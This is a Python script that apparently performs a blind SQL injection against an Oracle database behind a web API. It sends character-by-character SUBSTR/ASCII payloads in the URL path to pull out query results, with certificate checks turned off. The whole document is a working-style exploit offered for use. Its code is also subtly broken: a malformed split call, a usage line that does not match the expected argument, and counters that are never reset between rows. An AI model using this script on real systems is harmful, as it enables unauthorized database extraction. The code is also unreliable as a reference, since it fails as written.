# usage
# python3 exploit.py "select ORA_DB_NAME from dual" 1

import requests as req
import sys

req.packages.urllib3.disable_warnings()

if __name__ == "__main__":

    if len(sys.argv) != 3:
        print(f"Usage: python3 blind_sql_injection <query> <row-number>")
        sys.exit(-1)

    print("Arguments given:")
    for arg_nr in range(1, len(sys.argv)):
        print(f"Arg{arg_nr}: {sys.argv[arg_nr]}")
    print()

    url="https://10.0.0.1/api/product/"            # change this

    headers = {}
    cookies = {}
    body = {}

    grep_string="The movie exists in our database!"
    charset="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.:,;-_@"
    query = sys.argv[1]
    
    row_range = sys.argv[2]
    min_row_nr = int(row_range.split['-'][0])
    max_row_nr = int(row_range.split['-'][1])

    result = ""

    print(f"Extracting the results for the \"{query}\" query...")
    print(f"Extracting the row number {min_row_nr} up to {max_row_nr}")
    print(f"Charset used: {charset}")
    print()

    nth_char = 1
    found = True

    for row_number in range(min_row_nr, max_row_nr+1):
        while found:
            found = False

            for char in charset:
                path = f"2' AND {ord(char)}=ASCII(SUBSTR(({query} OFFSET {row_number - 1} ROWS FETCH NEXT 1 ROWS ONLY), {nth_char}, 1)) --"
                res = req.request(method="GET", url=url+path, allow_redirects=False, verify=False)

                if res.status_code == 200:
                    print(f"Row number: {row_number}. Character number {nth_char} found: {char}")

                    result += char
                    nth_char += 1
                    found = True
                    break

        print(f"Row number: {row_number}. Result:", result)
